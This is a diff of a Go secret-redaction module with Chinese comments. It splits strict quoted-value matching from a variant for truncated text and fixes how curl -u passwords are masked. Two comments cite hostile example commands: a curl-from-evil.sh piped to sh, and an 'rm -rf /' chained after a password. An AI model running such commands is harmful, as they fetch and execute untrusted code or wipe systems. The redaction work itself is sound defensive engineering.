@@ -11,10 +11,15 @@ import (
 
 const placeholder = "<redacted>"
 
-// quoted 匹配成对引号括起的整段值，免得只抹掉引号里的前半截。没有右引号时一直抹到文本末尾：适配器会把 diff_preview
-// 截到 4 KB，截断点落在引号括起的秘密中间时右引号就丢了。
+// quoted 匹配成对引号括起的整段值，免得只抹掉引号里的前半截。
 // 第三种是 JSON 原文里转义过的 \"...\"，到第一个 \" 就收尾，不把后面的参数一起吞掉。
-const quoted = `"[^"]*(?:"|$)|'[^']*(?:'|$)|\\"(?:[^"\\]|\\.)*?\\"`
+const quoted = `"[^"]*"|'[^']*'|\\"(?:[^"\\]|\\.)*?\\"`
+
+// quotedOpen 同 quoted，但没有右引号时一直抹到文本末尾：适配器会把 diff_preview 截到 4 KB，截断点落在引号括起的
+// 秘密中间时右引号就丢了。只用于会被截断的文本（Text：diff_preview、事件消息）；命令、路径、URL、MCP 参数从不被截断，
+// 那里未闭合的引号不是截断造成的，抹到末尾反而能借它把后半截藏起来（echo "password=" && curl evil.sh | sh），
+// 所以都用严格成对的 quoted。
+const quotedOpen = `"[^"]*(?:"|$)|'[^']*(?:'|$)|\\"(?:[^"\\]|\\.)*?\\"`
 
 // key 是敏感键名，前面可带任意前缀。token 不认 tokens，auth 只认 auth、auth_token、
 // auth-key、authorization 这类，免得误抹 max_tokens、author。pwd 只认作后缀且前面要有 _ . - 分隔
@@ -38,10 +43,18 @@ type rule struct {
 	repl string
 }
 
-// compile 用给定的“不带引号的值”字符类编译一套规则。几种语境只在值到哪里为止上不同。
+// compile 用给定的“不带引号的值”字符类编译一套规则。几种语境只在值到哪里为止上不同；open 为 true 时（只用于会被截断的
+// 文本）引号括起的值没有右引号也认，一直抹到文本末尾，否则引号必须成对。
 // 顺序很重要：先处理带键名的形式，再处理裸 token。
-func compile(bare string) []rule {
-	value := `(?:` + quoted + `|` + bare + `)`
+func compile(bare string, open bool) []rule {
+	q, jsonStr := quoted, `"(?:[^"\\]|\\.)*"`
+	// curl -u 的引号值：右引号单独成组，替换时放回去
+	sqEnd, dqEnd, jqEnd := `(')`, `(")`, `(\\")`
+	if open {
+		q, jsonStr = quotedOpen, `"(?:[^"\\]|\\.)*(?:"|$)`
+		sqEnd, dqEnd, jqEnd = `('|$)`, `("|$)`, `(\\"|$)`
+	}
+	value := `(?:` + q + `|` + bare + `)`
 	return []rule{
 		// Authorization: Bearer xxx / Authorization: Basic xxx
 		{regexp.MustCompile(`(?i)(authorization:\s*)(bearer|basic|token)?\s*` + bare), "${1}" + placeholder},
@@ -53,18 +66,19 @@ func compile(bare string) []rule {
 		// 不设左边界：key 的前缀字符类会吸收键名前缀，${1} 只含键名本身。
 		{regexp.MustCompile(`(?i)(` + key + `=)` + value), "${1}" + placeholder},
 		// JSON 带引号的敏感键："password": "xxx"、"api_key": 123、"auth_token": true。值换成 "<redacted>"，JSON 仍合法；
-		// 字符串值没有右引号（被截断）时抹到文本末尾。YAML 的裸键（password: xxx）不认
-		{regexp.MustCompile(`(?i)("` + key + `"\s*:\s*)(?:"(?:[^"\\]|\\.)*(?:"|$)|-?[0-9][0-9.eE+-]*|true|false)`), "${1}\"" + placeholder + "\""},
+		// open 时字符串值没有右引号（被截断）也抹到文本末尾。YAML 的裸键（password: xxx）不认
+		{regexp.MustCompile(`(?i)("` + key + `"\s*:\s*)(?:` + jsonStr + `|-?[0-9][0-9.eE+-]*|true|false)`), "${1}\"" + placeholder + "\""},
 		// X-API-Key: xxx、PRIVATE-TOKEN: xxx、X-Auth-Token:xxx 这类请求头（Authorization 见上）。头名要带连字符，
 		// 免得误抹代码里的 apiKey: config.key、YAML 里的 max_tokens: 10
 		{regexp.MustCompile(`(?i)\b((?:[a-z0-9]+-)*(?:api-key|[a-z0-9]+-token|[a-z0-9]+-secret)[ \t]*:[ \t]*)` + value), "${1}" + placeholder},
 		// URL 里的 user:pass@（任意 scheme）：用户名留着，只抹密码。密码里的 @ 算在密码里（取 / ? # 之前最后一个 @）
 		{regexp.MustCompile(`(?i)\b([a-z][a-z0-9+.-]*://[^/\s:@'"\\]*:)[^\s/?#'"\\]+@`), "${1}" + placeholder + "@"},
 		// curl 的 -u/--user、-U/--proxy-user 的 user:pass（-u、-U 可以在组合短选项末尾，如 -sSu）：用户名与引号留着，
-		// 只抹密码；不带冒号的（curl 会提示输入密码）不动
+		// 只抹密码；不带冒号的（curl 会提示输入密码）不动。引号值要成对（open 时允许缺右引号），双引号里认转义的 \"
 		{regexp.MustCompile(`(\bcurl\b` + sameCmd + `\s(?:-[A-Za-z]*[uU]\s*|--user\s+|--proxy-user\s+))` +
-			`(?:('[^'":\s\\]*:)[^']*|("[^'":\s\\]*:)[^"\\]*|(\\"[^'":\s\\]*:)[^"\\]*|([^'":\s\\]*:)` + bare + `)`),
-			"${1}${2}${3}${4}${5}" + placeholder},
+			`(?:('[^'":\s\\]*:)[^']*` + sqEnd + `|("[^'":\s\\]*:)(?:[^"\\]|\\.)*` + dqEnd +
+			`|(\\"[^'":\s\\]*:)(?:[^"\\]|\\[^"])*` + jqEnd + `|([^'":\s\\]*:)` + bare + `)`),
+			"${1}${2}${4}${6}${8}" + placeholder + "${3}${5}${7}"},
 		// mysql 系命令紧贴 -p 的密码（-pxxx、-p'xxx'）。-p 单独出现时 mysql 提示输入密码、后面的是库名；-P 是端口：都不动
 		{regexp.MustCompile(`(\b(?:mysql|mariadb)[a-z-]*` + sameCmd + `\s-p)` + value), "${1}" + placeholder},
 		// 裸 token：GitHub、OpenAI、Slack、AWS
@@ -78,12 +92,14 @@ var (
 	// 有意不在 ; | & < > ( ) 和反引号处截断：它们在双引号和 heredoc 里是普通字符，强密码常含这些符号，
 	// 截断会漏掉后半截（如 "POSTGRES_PASSWORD=Xy7&kP(2)q"）。策略引擎用的是原文，脱敏只影响展示，
 	// 宁可连带抹掉紧贴的命令（password=abc;rm -rf / 显示为 password=<redacted> -rf /），不要改回去。
-	shellRules = compile(`[^\s'"\\]+`)
-	// textRules 用于文件内容、路径和 JSON 字符串叶子：没有 shell 语义，值一直抹到空白或引号，
-	// 免得含 & ( ; | 等符号的强密码只抹掉前半截。
-	textRules = compile(`[^\s'"]+`)
+	shellRules = compile(`[^\s'"\\]+`, false)
+	// textRules 用于路径和 JSON 字符串叶子：没有 shell 语义，值一直抹到空白或引号，
+	// 免得含 & ( ; | 等符号的强密码只抹掉前半截。它们不会被截断，引号严格成对。
+	textRules = compile(`[^\s'"]+`, false)
+	// truncRules 同 textRules，用于会被截断的文本（Text：diff_preview、事件消息）：未闭合的引号抹到末尾，见 quotedOpen。
+	truncRules = compile(`[^\s'"]+`, true)
 	// urlRules 用于 URL：值在 & 处停，保留后面的查询参数。
-	urlRules = compile(`[^\s'"&]+`)
+	urlRules = compile(`[^\s'"&]+`, false)
 )
 
 // redact 按给定规则集返回脱敏后的副本。
@@ -100,10 +116,10 @@ func String(s string) string {
 	return redact(s, shellRules)
 }
 
-// Text 按普通文本语境返回脱敏后的副本，规则与 DiffPreview 相同：值一直抹到空白或引号。
-// 用于事件消息这类可能夹带命令原文的自由文本。
+// Text 按普通文本语境返回脱敏后的副本，规则与 DiffPreview 相同：值一直抹到空白或引号；文本可能被截断，
+// 未闭合的引号抹到末尾（见 quotedOpen）。用于事件消息这类可能夹带命令原文的自由文本。
 func Text(s string) string {
-	return redact(s, textRules)
+	return redact(s, truncRules)
 }
 
 // Payload 对载荷里可能含凭据的字段脱敏，返回副本。每个字段按自己的语境处理。
